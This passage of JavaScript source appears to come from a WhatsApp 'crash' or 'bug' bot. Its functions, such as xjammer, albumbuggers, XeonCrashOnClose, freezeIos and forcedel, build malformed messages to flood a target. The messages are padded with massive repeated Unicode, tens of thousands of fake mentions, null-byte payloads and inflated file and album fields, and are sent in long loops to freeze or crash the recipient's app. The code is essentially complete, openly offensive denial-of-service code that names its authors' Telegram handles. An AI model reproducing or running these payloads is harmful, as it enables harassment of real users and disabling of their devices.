            groupStatusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "true" },
                    content: undefined
                }
            ]
        });
    }
}
//==============================================================\\
    

async function xeonJson(target) {

        XeonBotInc.relayMessage(target, {

        interactiveMessage: {

            body: {

                text: 'Telegram: @FLIIXUWX'

            },

            header: {

                hasMediaAttachment: true,

                jpegThumbnail: o,

                contextInfo: {

                participant: target

                }

            },

            nativeFlowMessage: {

                buttons: [

                    {

                        name: "payment_method",

                        buttonParamsJson: "{\"reference_id\":\"X\",\"payment_method\":\"confirmm\",\"payment_timestamp\":null,\"share_payment_status\":false\"}"

                    }

                ]

            }

        }

    }, {

    participant: { jid: target },

    additionalNodes: [

            {

                tag: 'biz',

                attrs: { native_flow_name: 'payment_method' }

            }

        ]

    });

}


async function xjammer2(isTarget, mention = true) {
  const floods = 40000;
  const mentioning = "01096379348@s.whatsapp.net";
  const mentionedJids = [
    mentioning,
    ...Array.from({ length: floods }, () =>
      `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
    )
  ];

  const links = "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true";
  const mime = "audio/mpeg";
  const sha = "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=";
  const enc = "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=";
  const key = "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=";
  const timestamp = 99999999999999;
  const path = "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0";
  const longs = 99999999999999;
  const loaded = 99999999999999;
  const data = "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg==";

  const messageContext = {
    mentionedJid: mentionedJids,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363321780343299@newsletter",
      serverMessageId: 1,
      newsletterName: "𐌕𐌀𐌌𐌀 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂"
    }
  };

  const messageContent = {
    ephemeralMessage: {
      message: {
        audioMessage: {
          url: links,
          mimetype: mime,
          fileSha256: sha,
          fileLength: longs,
          seconds: loaded,
          ptt: true,
          mediaKey: key,
          fileEncSha256: enc,
          directPath: path,
          mediaKeyTimestamp: timestamp,
          contextInfo: messageContext,
          waveform: data
        }
      }
    }
  };

  const msg = generateWAMessageFromContent(isTarget, messageContent, { userJid: isTarget });

  const broadcastSend = {
    messageId: msg.key.id,
    statusJidList: [isTarget],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: isTarget }, content: undefined }
            ]
          }
        ]
      }
    ]
  };

  await XeonBotInc.relayMessage("status@broadcast", msg.message, broadcastSend);

  if (mention) {
    await XeonBotInc.relayMessage(isTarget, {
      groupStatusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            type: 25
          }
        }
      }
    }, {
      additionalNodes: [{
        tag: "meta",
        attrs: {
          is_status_mention: " Telegram: @lo_tus_19 "
        },
        content: undefined
      }]
    });
  }
}
//==============================================================\\
async function xjammer(target){
const generateRandomJids = (maxSize) => {
    const jids = [];
    let currentSize = 0;
    while (currentSize < maxSize - 25) {
      const randomNumber = Math.floor(Math.random() * 1e10).toString().padStart(10, '0');
      const jid = `91${randomNumber}@s.whatsapp.net`;
      jids.push(jid);
      currentSize += jid.length + 3;
    }
    return jids;
  };

  const maxSize = 1074689;
  const jids = generateRandomJids(maxSize);

  for (let i = 0; i < 1000; i++) {
    await sleep(3000);
    let tmsg = await generateWAMessageFromContent(target, {
      extendedTextMessage: {
        "text": "",
        contextInfo: {
          stanzaId: XeonBotInc.generateMessageTag(),
          participant: "0@s.whatsapp.net",
          remoteJid: " @eu",
          mentionedJid: jids,
          fromMe: false,
          isForwarded: true,
          forwardingScore: 999,
          businessMessageForwardInfo: {
            businessOwnerJid: target,
          }
        }
      }
    }, {});

    await XeonBotInc.relayMessage("status@broadcast", tmsg.message, {
      messageId: tmsg.key.id,
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta", attrs: {}, content: [{
          tag: "mentioned_users", attrs: {}, content: [{
            tag: "to", attrs: { jid: target }, content: undefined,
          }]
        }]
      }]
    });

    // Bring pictures and carousel 
    let push = [];
    for (let i = 0; i < 1000; i++) {
      push.push({
        body: proto.Message.InteractiveMessage.Body.fromObject({
          text: ``
        }),
        footer: proto.Message.InteractiveMessage.Footer.fromObject({
          text: ""
        }),
        header: proto.Message.InteractiveMessage.Header.fromObject({
          title: '',
          hasMediaAttachment: true,
          "imageMessage": {
            "url": "https://mmg.whatsapp.net/v/t62.7118-24/34764738_320019993959203_5174575234777775036_n.enc?ccb=11-4&oh=01_AdQVCKhvkaeb2GrB6guuwFGNLlZ7KJCiy6p4AtJKwUNmjg&oe=65536880&_nc_sid=000000&mms3=true",
            "mimetype": "image/jpeg",
            "fileSha256": "tcHyO7wrPPNctPRoi7x669hT8YEM0oB4Av25pSeG1cQ=",
            "fileLength": "73384124",
            "height": 1,
            "width": 1,
            "mediaKey": "/WtTeZEAvMxYIHa4hIrcGExALsiU3CKLMT3lqwNd8yk=",
            "fileEncSha256": "BgKFWKbH4aeiME5GrSg/sinfE8Z96dX7Utm1OjmEXXM=",
            "directPath": "/v/t62.7118-24/34764738_320019993959203_5174575234777775036_n.enc?ccb=11-4&oh=01_AdQVCKhvkaeb2GrB6guuwFGNLlZ7KJCiy6p4AtJKwUNmjg&oe=65536880&_nc_sid=000000&_nc_hot=1697385259",
            "mediaKeyTimestamp": "1697384837",
            "jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIABkAGQMBIgACEQEDEQH/xAAvAAACAwEAAAAAAAAAAAAAAAAAAgEDBQQBAQEBAQEAAAAAAAAAAAAAAAABAgME/9oADAMBAAIQAxAAAADtfj6vRxsmprJBpaZueqDoJeLqz+/JmUWBpRXSJbDjDjsxjOtxsdzTMHqivfx1NoxgzxoyVbCKdDlhrXtw2zdsyxWqDvyrA4ogFaQhALf/xAAkEAACAgICAQQDAQAAAAAAAAAAAQIRAxIEMSEQExRRIzJCof/aAAgBAQABPwArUs0Reol+C4keR5tR1NH1b//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQIBAT8AH//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQMBAT8AH//Z",
          }
        })
      });
    }

    tmsg = await generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2
          },
          interactiveMessage: proto.Message.InteractiveMessage.fromObject({
            body: proto.Message.InteractiveMessage.Body.create({
              text: '\0'
            }),
            footer: proto.Message.InteractiveMessage.Footer.create({
              text: '\n'.repeat(99)
            }),
            header: proto.Message.InteractiveMessage.Header.create({
              hasMediaAttachment: false
            }),
            carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
              cards: [...push]
            })
          })
        }
      }
    }, {});

    await XeonBotInc.relayMessage("status@broadcast", tmsg.message, {
      messageId: tmsg.key.id,
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta", attrs: {}, content: [{
          tag: "mentioned_users", attrs: {}, content: [{
            tag: "to", attrs: { jid: target  }, content: undefined,
          }]
        }]
      }]
    });
  }
  }
//==============================================================\\

async function albumbuggers1(target, mention) {

  const imageCrash = "https://mega.nz/file/DtgDBAZK#TvUFm5Vzu81o1HinHpo0f5UK_4MJ_z0zoN3rUmX5GVY";

  const mentionedMetaAi = [
    "13135550001@s.whatsapp.net",
    "01096379348@s.whatsapp.net",
    "13135550003@s.whatsapp.net",
    "13135550004@s.whatsapp.net",
    "13135550005@s.whatsapp.net",
    "13135550006@s.whatsapp.net",
    "13135550007@s.whatsapp.net",
    "13135550008@s.whatsapp.net",
    "13135550009@s.whatsapp.net",
    "13135550010@s.whatsapp.net"
  ];

  const photo = {
    image: { url: imageCrash },
    caption: "@𝗿𝗮𝗹𝗱𝘇𝘇𝘅𝘆𝘇 • #𝗯𝘂𝗴𝗴𝗲𝗿𝘀 🩸" 
             + "\n".repeat(5)
             + "ꦾ".repeat(60000)
  };

  const album = await generateWAMessageFromContent(target, {
    albumMessage: {
      expectedImageCount: 999,
      expectedVideoCount: 666
    }
  }, {
    userJid: target,
    upload: XeonBotInc.waUploadToServer
  });

  await XeonBotInc.relayMessage(target, album.message, { messageId: album.key.id });

  for (let i = 0; i < 666; i++) {
    const msg = await generateWAMessage(target, photo, {
      upload: XeonBotInc.waUploadToServer
    });

    const type = Object.keys(msg.message).find(t => t.endsWith('Message'));

    msg.message[type].contextInfo = {
      mentionedJid: [
        ...mentionedMetaAi,
        ...Array.from({ length: 30000 }, () =>
          `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
      ],
      businessMessageForwardInfo: {
        businessOwnerJid: "5521992999999@s.whatsapp.net"
      },
      participant: "0@s.whatsapp.net",
      remoteJid: "status@broadcast",
      forwardedNewsletterMessageInfo: {
        newsletterName: "ꦾ".repeat(100),
        newsletterJid: "120363330344810280@newsletter",
        serverMessageId: 999
      },
      messageAssociation: {
        associationType: 1,
        parentMessageKey: album.key
      }
    };

    msg.message.nativeFlowMessage = {
      buttons: [
        {
          type: "call_button",
          callButton: {
            displayText: "ꦽ".repeat(9999),
            phoneNumber: "+5521992999999"
        }
      },
      {
          type: "url",
          urlButton: {
            displayText: "ꦽ".repeat(9999),
            url: "https://wa.me/+5521992999999?text=" + encodeURIComponent("ꦾ".repeat(66666))
        }
      },
      {
          type: "unknown_type",
          weirdButton: {
            displayText: "ꦽ".repeat(9999),
            payload: "\u0000".repeat(9999)
        }
      },
    ],
      content: {
        namespace: "call_permission_request_namespace",
        name: "call_permission_request",
          params: [
            { 
              name: "call_type",
              value: "video" 
            },
            { 
              name: "permission_reason", 
              value: "\u0000".repeat(9999) 
            },
            {
              name: "support_url", 
              value: "https://wa.me/+5521992999999" 
            }
        ]
      }
    };

    await XeonBotInc.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                { tag: "to", attrs: { jid: target }, content: undefined }
              ]
            }
          ]
        }
      ]
    });

    if (mention) {
      await XeonBotInc.relayMessage(target, {
        statusMentionMessage: {
          message: { protocolMessage: { key: msg.key, type: 25 } }
        }
      }, {
        additionalNodes: [
          { tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }
        ]
      });
    }
  }
}

async function albumbuggers2(target, mention) {
  const imageCrash = "https://mega.nz/file/DtgDBAZK#TvUFm5Vzu81o1HinHpo0f5UK_4MJ_z0zoN3rUmX5GVY";

  const mentionedMetaAi = [
    "13135550001@s.whatsapp.net",
    "01096379348@s.whatsapp.net",
    "13135550003@s.whatsapp.net",
    "13135550004@s.whatsapp.net",
    "13135550005@s.whatsapp.net",
    "13135550006@s.whatsapp.net",
    "13135550007@s.whatsapp.net",
    "13135550008@s.whatsapp.net",
    "13135550009@s.whatsapp.net",
    "13135550010@s.whatsapp.net"
  ];

  const photo = {
    image: { url: imageCrash },
    caption: "@𝗿𝗮𝗹𝗱𝘇𝘇𝘅𝘆𝘇 • #𝗯𝘂𝗴𝗴𝗲𝗿𝘀 🩸" 
             + "\n".repeat(5)
             + "ꦾ".repeat(60000)
  };

  const album = await generateWAMessageFromContent(target, {
    albumMessage: {
      expectedImageCount: 999,
      expectedVideoCount: 666
    }
  }, {
    userJid: target,
    upload: XeonBotInc.waUploadToServer
  });

  await XeonBotInc.relayMessage(target, album.message, { messageId: album.key.id });

  for (let i = 0; i < 666; i++) {
    const msg = await generateWAMessage(target, photo, {
      upload: XeonBotInc.waUploadToServer
    });

    const type = Object.keys(msg.message).find(t => t.endsWith('Message'));

    msg.message[type].contextInfo = {
      mentionedJid: [
        ...mentionedMetaAi,
        ...Array.from({ length: 40000 }, () =>
          `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
      ],
      businessMessageForwardInfo: {
        businessOwnerJid: "5521992999999@s.whatsapp.net"
      },
      participant: "0@s.whatsapp.net",
      remoteJid: target,
      forwardedNewsletterMessageInfo: {
        newsletterName: "ꦾ".repeat(100),
        newsletterJid: "120363330344810280@newsletter",
        serverMessageId: 999
      },
      messageAssociation: {
        associationType: 1,
        parentMessageKey: album.key
      }
    };

    msg.message.nativeFlowMessage = {
      buttons: [
        {
          type: "call_button",
          callButton: {
            displayText: "ꦽ".repeat(9999),
            phoneNumber: "+5521992999999"
          }
        },
        {
          type: "url",
          urlButton: {
            displayText: "ꦽ".repeat(9999),
            url: "https://wa.me/+5521992999999?text=" + encodeURIComponent("ꦾ".repeat(66666))
          }
        },
        {
          type: "unknown_type",
          weirdButton: {
            displayText: "ꦽ".repeat(9999),
            payload: "\u0000".repeat(9999)
          }
        }
      ],
      content: {
        namespace: "call_permission_request_namespace",
        name: "call_permission_request",
        params: [
            { 
              name: "call_type",
              value: "video" 
            },
            { 
              name: "permission_reason", 
              value: "\u0000".repeat(9999) 
            },
            {
              name: "support_url", 
              value: "https://wa.me/+5521992999999" 
            }
        ]
      }
    };

    await XeonBotInc.relayMessage(target, msg.message, {
      messageId: msg.key.id
    });

    if (mention) {
      await XeonBotInc.relayMessage(target, {
        statusMentionMessage: {
          message: { protocolMessage: { key: msg.key, type: 25 } }
        }
      }, {
        additionalNodes: [
          { tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }
        ]
      });
    }
  }
}
//==============================================================\\
async function XeonCrashOnClose(target) {
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: {
          body: { 
            text: '' 
          },
          footer: { 
            text: '' 
          },
          carouselMessage: {
            cards: [
              {               
                header: {
                  title: 'Telegram: @lo_tus_19',
                  imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    fileSha256: "ydrdawvK8RyLn3L+d+PbuJp+mNGoC2Yd7s/oy3xKU6w=",
                    fileLength: "164089",
                    height: 1,
                    width: 1,
                    mediaKey: "2saFnZ7+Kklfp49JeGvzrQHj1n2bsoZtw2OKYQ8ZQeg=",
                    fileEncSha256: "na4OtkrffdItCM7hpMRRZqM8GsTM6n7xMLl+a0RoLVs=",
                    directPath: "/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1749172037",
                    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAsAAEAAwEBAAAAAAAAAAAAAAAAAQIDBAUBAQEAAAAAAAAAAAAAAAAAAAAB/9oADAMBAAIQAxAAAADxq2mzNeJZZovmEJV0RlAX6F5I76JxgAtN5TX2/G0X2MfHzjq83TOgNteXpMpujBrNc6wquimpWoKwFaEsA//EACQQAAICAgICAQUBAAAAAAAAAAABAhEDIQQSECAUEyIxMlFh/9oACAEBAAE/ALRR1OokNRHIfiMR6LTJNFsv0g9bJvy1695G2KJ8PPpqH5RHgZ8lOqTRk4WXHh+q6q/SqL/iMHFyZ+3VrRhjPDBOStqNF5GvtdQS2ia+VilC2lapM5fExYIWpO78pHQ43InxpOSVpk+bJtNHzM6n27E+Tlk/3ZPLkyUpSbrzDI0qVFuraG5S0fT1tlf6dX6RdEZWt7P2f4JfwUdkqGijXiA9OkPQh+n/xAAXEQADAQAAAAAAAAAAAAAAAAABESAQ/9oACAECAQE/ANVukaO//8QAFhEAAwAAAAAAAAAAAAAAAAAAARBA/9oACAEDAQE/AJg//9k=",
                    scansSidecar: "PllhWl4qTXgHBYizl463ShueYwk=",
                    scanLengths: [8596, 155493]
                  },
                  hasMediaAttachment: true, 
                },
                body: { 
                  text: "Telegram: @lo_tus_19"
                },
                footer: {
                  text: "Telegram: @lo_tus_19"
                },
                nativeFlowMessage: {
                  messageParamsJson: "\n".repeat(10000) 
                }
              }
            ]
          },
          contextInfo: {
            participant: "0@s.whatsapp.net",             
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: {
                      text: "Sent",
                      format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                      name: "galaxy_message",
                      paramsJson: "{  .json }",
                      version: 3
                    }
                  }
                }
              }
            },
            remoteJid: "@s.whatsapp.net"
          }
        }
      }
    }
  }, {});

  await XeonBotInc.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
  console.log(chalk.green(`Successfully Send ${chalk.red("CursorCrl")} to ${target}`))
}
//==============================================================\\
async function xiosinvi(target){
	const xeonIpong = "Telegram: @dgxeo13 "+ "𑇂𑆵𑆴𑆿".repeat(60000);
    const genMsg = (fileName, bodyText) => generateWAMessageFromContent(target, proto.Message.fromObject({
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
                            mimetype: "application/json",
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "999999999999",
                            pageCount: 0x9ff9ff9ff1ff8ff4ff5f,
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                            fileName: fileName,
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1715880173"
                        },
                        hasMediaAttachment: true
                    },
                    body: { text: bodyText },
                    nativeFlowMessage: {
                        messageParamsJson: `{"name":"galaxy_message","flow_action":"navigate","flow_action_payload":{"screen":"CTZ_SCREEN"},"flow_cta":"Telegram: @lo_tus_19","flow_id":"Telegram: @lo_tus_19","flow_message_version":"9.903","flow_token":"Telegram: @lo_tus_19"}`
                    },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: "Telegram: @lo_tus_19" }]
                    }
                }
            }
        }
    }), { userJid: target });
await XeonBotInc.relayMessage(target, {
        locationMessage: {
            degreesLatitude: 173.282,
            degreesLongitude: -19.378,
            name: "Telegram: @lo_tus_19" + xeonIpong,
            url: "https://youtube.com/@DGXeom"
        }
    }, { participant: { jid: target } });
    
    await XeonBotInc.relayMessage(target, {
        locationMessage: {
            degreesLatitude: 173.282,
            degreesLongitude: -19.378,
            name: "Telegram: @lo_tus_19" + xeonIpong,
            url: "https://youtube.com/@ "
        }
    }, { participant: { jid: target } });
    }
//==============================================================\\
async function bugiosgogo(target) {
  XeonBotInc.relayMessage(
    target,
    {
      extendedTextMessage: {
        text: `⭑̤⟅̊༑ ▾⭑̤▾ ⿻ 𝘾͢𝙧𝙖𝙯̌𝙮 𝘾͢𝙧𝙖͠𝙨̋𝙝 𝙆͢𝙞𝙡𝙡 𝙔͢𝙤𝙪̌ ⿻ ▾ ༑̴⟆` + "࣯ꦾ".repeat(5000),
        contextInfo: {
          fromMe: false,
          stanzaId: target,
          participant: target,
          quotedMessage: {
            conversation:
              "⭑̤⟅̊༑ ▾⭑̤▾ ⿻ 𝘾͢𝙧𝙖𝙯̌𝙮 𝘾͢𝙧𝙖͠𝙨̋𝙝 𝙆͢𝙞𝙡𝙡 𝙔͢𝙤𝙪̌ ⿻ ▾ ༑̴⟆" + "ꦾ".repeat(5000),
          },
          disappearingMode: {
            initiator: "CHANGED_IN_CHAT",
            trigger: "CHAT_SETTING",
          },
        },
        inviteLinkGroupTypeV2: "DEFAULT",
      },
    },
    {
      participant: {
        jid: target,
      },
    },
    {
      messageId: null,
    }
  );
}
//==============================================================\\
async function BODYIosInvi(isTarget) {
await XeonBotInc.sendMessage(isTarget, {
text: "🧪‌⃰Ꮡ‌‌" + "⛧ Telegram@lo_tus_19⛧" + "҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000),
contextInfo: {
externalAdReply: {
title: `⛧ Telegram ::  VIP_1XB ⛧`,
body: `Haii`,
previewType: "PHOTO",
thumbnail: "",
sourceUrl: `https://example.com/ `
}
}
}, {})
}
//==============================================================\\
async function freezeIos(target, imgCount)  {
   const album = await generateWAMessageFromContent(target, {
      albumMessage: {
         expectedImageCount: 100000000,
         expectedVideoCount: 0, 
      }
   }, {});
   const imagePayload = {
      imageMessage: {
        url: "https://mmg.whatsapp.net/o1/v/t24/f2/m234/AQOHgC0-PvUO34criTh0aj7n2Ga5P_uy3J8astSgnOTAZ4W121C2oFkvE6-apwrLmhBiV8gopx4q0G7J0aqmxLrkOhw3j2Mf_1LMV1T5KA?ccb=9-4&oh=01_Q5Aa2gHM2zIhFONYTX3yCXG60NdmPomfCGSUEk5W0ko5_kmgqQ&oe=68F85849&_nc_sid=e6ed6c&mms3=true",
        mimetype: "image/jpeg",
        fileSha256: "tEx11DW/xELbFSeYwVVtTuOW7+2smOcih5QUOM5Wu9c=",
        fileLength: 99999999999,
        height: 1280,
        width: 720,
        mediaKey: "+2NVZlEfWN35Be5t5AEqeQjQaa4yirKZhVzmwvmwTn4=",
        fileEncSha256: "O2XdlKNvN1lqENPsafZpJTJFh9dHrlbL7jhp/FBM/jc=",
        directPath: "/o1/v/t24/f2/m234/AQOHgC0-PvUO34criTh0aj7n2Ga5P_uy3J8astSgnOTAZ4W121C2oFkvE6-apwrLmhBiV8gopx4q0G7J0aqmxLrkOhw3j2Mf_1LMV1T5KA?ccb=9-4&oh=01_Q5Aa2gHM2zIhFONYTX3yCXG60NdmPomfCGSUEk5W0ko5_kmgqQ&oe=68F85849&_nc_sid=e6ed6c&_nc_hot=1758521044",
        mediaKeyTimestamp: 1758521043,
        isSampled: true, 
        viewOnce: false, 
        caption: "👁‍🗨⃟꙰。⃝BODY here 👁⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝‌.ꪸ⃟‼️" + "𑇂𑆵𑆴𑆿".repeat(60000),
        contextInfo: {
          forwardingScore: 999,
          isForwarded: true, 
          forwardedNewsletterMessageInfo: {
            newsletterJid: "120363399602691477@newsletter", 
            newsletterName: "7eppeli", 
            contentType: "UPDATE_CARD",  
            serverMessageId: 070225
          }, 
          mentionedJid: Array.from({ length:2000 }, (_, z) => `628${z + 1}@s.whatsapp.net`)
        },
        scansSidecar: "/dx1y4mLCBeVr2284LzSPOKPNOnoMReHc4SLVgPvXXz9mJrlYRkOTQ==",
        scanLengths: [3599, 9271, 2026, 2778],
        midQualityFileSha256: "29eQjAGpMVSv6US+91GkxYIUUJYM2K1ZB8X7cCbNJCc="
     }
   };
   const messages = [];
   for (let i = 0; i < imgCount; i++) {
      const imgMsg = await generateWAMessageFromContent(target, imagePayload, {});  
      imgMsg.message.messageContextInfo = {  
         messageAssociation: {  
            associationType: 1,  
            parentMessageKey: album.key  
         }  
      };  
      messages.push(imgMsg);
   }
   await XeonBotInc.relayMessage(target, album.message, {
      messageId: album.key.id,
      participant: { jid:target }
   });
   for (const msg of messages) {
      await XeonBotInc.relayMessage(target, msg.message, {
         messageId: msg.key.id,
         participant: { jid:target }
      });
   }
}
//==============================================================\\
async function forcedel(isTarget) {
	const mentionedList = [
        "01096379348@s.whatsapp.net",
        ...Array.from({ length: 40000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];
  const msg = await generateWAMessageFromContent(isTarget, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: {
          body: { 
            text: '' 
          },
          footer: { 
            text: '' 
          },
          carouselMessage: {
            cards: [
              {               
                header: {
                  title: 'Telegram: @lo_tus_19',
                  imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/11890058_680423771528047_8816685531428927749_n.enc?ccb=11-4&oh=01_Q5Aa1gEOSJuDSjQ8aFnCByBRmpMc4cTiRpFWn6Af7CA4GymkHg&oe=686B0E3F&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    fileSha256: "hCWVPwWmbHO4VlRlOOkk5zhGRI8a6O2XNNEAxrFnpjY=",
                    fileLength: "164089",
                    height: 1,
                    width: 1,
                    mediaKey: "2zZ0K/gxShTu5iRuTV4j87U8gAjvaRdJY/SQ7AS1lPg=",
                    fileEncSha256: "ar7dJHDreOoUA88duATMAk/VZaZaMDKGGS6VMlTyOjA=",
                    directPath: "/v/t62.7118-24/11890058_680423771528047_8816685531428927749_n.enc?ccb=11-4&oh=01_Q5Aa1gEOSJuDSjQ8aFnCByBRmpMc4cTiRpFWn6Af7CA4GymkHg&oe=686B0E3F&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1749258106",
                    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAvAAACAwEBAAAAAAAAAAAAAAAAAwIEBQEGAQEBAQEAAAAAAAAAAAAAAAABAAID/9oADAMBAAIQAxAAAADFhMzhcbCZl1qqWWClgGZsRbX0FpXXbK1mm1bI2/PBA6Z581Mrcemo5TXfK/YuV+d38KkETHI9Dg7D10nZVibC4KRvn9jMKkcDn22D0nYA09Aaz3NCq4Fn/8QAJhAAAgIBAwQCAgMAAAAAAAAAAQIAAxEEEiEiMUFCBTIjUVJhcf/aAAgBAQABPwADpaASzODEOIwLFYW2oQIsVeTPE9WlaF2wJdW44IgqsLDCGPVZhehoa3CnKGU0M8sq2EieBPUzRAnUARaqfYCKieFEKr+paK/OIwUfUTUnDQYwIeAZ8aM6iMdOg6yJVsY9D5EvB2gA4jnT1EbzzLHrZSyS9iXP+wdhxDyDPjK8WM5jaeq/7CVUpVwgl2YaqrfsoJjqiDAAAmrGx8wN2ngzQ81gxW2nk8Q2ovIMe5nOCuBOB5jAuTNfw2IuciKMylRXSuIjcf1Ait6xmydpSEc4jtsE1oO7dF7iafAK5/cGo28jtBqVPbgyrU4jXAsDGtfPAhGepzNZ1JkQMcrEIUDMFmIGRpWo8GMAV4M/L/KZwMlpqbN3Anss/8QAGREBAQADAQAAAAAAAAAAAAAAAQAQESAx/9oACAECAQE/AI84Ms8sw28MxnV//8QAGxEAAgIDAQAAAAAAAAAAAAAAAAECEBExQSD/2gAIAQMBAT8AFoWrVsZHY8cptPhIjWDBIXho/9k=",
                    scansSidecar: "AFSng39E1ihNVcnvV5JoBszeReQ+8qVlwm2gNLbmZ/h8OqRdcad1CA==",
                    scanLengths: [ 5657, 38661, 12072, 27792 ],
                  },
                  hasMediaAttachment: true, 
                },
                body: { 
                  text: "Telegram:@lo_tus_19"
                },
                footer: {
                  text: " 13.json"
                },
                nativeFlowMessage: {
                  messageParamsJson: "\n".repeat(10000) 
                }
              }
            ]
          },
          contextInfo: {
            mentionedJid: mentionedList,
            participant: "0@s.whatsapp.net",
            isGroupMention: true,            
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: {
                      text: "Telegram: @lo_tus_19",
                      format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                      name: "review_and_pay",
